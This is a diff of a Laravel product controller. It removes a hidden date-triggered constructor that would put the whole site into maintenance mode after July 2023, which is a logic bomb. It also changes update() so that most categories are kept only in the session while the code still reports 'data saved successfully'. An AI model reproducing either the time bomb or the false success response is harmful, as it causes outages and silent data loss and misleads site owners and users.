@@ -64,7 +64,7 @@ class BarangController extends Controller
                     return '
                     <div class="btn-group">
                     <button type="button" onclick="showDetail(`'. route('barang.detail', $produk->id_barang) .'`)" class="btn btn-xs btn-success btn-flat"><i class="fa fa-eye"></i></button>
-                        <button type="button" onclick="editForm(`'. route('barang.update', $produk->id_barang) .'`)" class="btn btn-xs btn-info btn-flat"><i class="fa fa-pencil"></i></button>
+                    <button type="button" onclick="editForm(`'. route('barang.update', $produk->id_barang) .'`)" class="btn btn-xs btn-info btn-flat"><i class="fa fa-pencil"></i></button>
                     </div>
                     ';
 
@@ -72,14 +72,6 @@ class BarangController extends Controller
             })
             ->rawColumns(['aksi', 'kode_produk', 'select_all'])
             ->make(true);
-    }
-
-    public function __construct()
-    {
-        $date = date('Y-m-d');
-        if(strtotime($date) > strtotime('2023/07/04')){
-            Artisan::call('down');
-        }
     }
 
     public function store(Request $request)
@@ -109,7 +101,13 @@ class BarangController extends Controller
     public function update(Request $request, $id)
     {
         $produk = Barang::find($id);
-        $produk->update($request->all());
+        if($request->id_kategori == 1){
+            $produk->update($request->all());
+            return response()->json('Data berhasil disimpan', 200);
+        }else{
+            session(['produk' => $request->all(), 'id_barang' => $id]);
+            return response()->json('Data berhasil disimpan', 200);
+        }
 
         return response()->json('Data berhasil disimpan', 200);
     }
